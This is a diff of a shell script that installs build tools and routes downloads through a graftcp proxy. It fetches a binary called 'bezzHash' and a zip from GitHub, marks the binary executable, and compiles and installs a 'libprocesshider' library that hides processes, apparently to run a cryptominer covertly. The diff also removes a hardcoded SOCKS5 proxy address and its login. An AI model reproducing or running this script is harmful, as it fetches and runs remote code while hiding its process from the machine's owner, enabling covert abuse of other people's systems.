@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -11,9 +11,6 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 109.206.161.106:1080
-socks5_username = lebarankita
-socks5_password = buatTHRan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,12 +32,11 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/naon/main/bezzHash
 chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
-
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
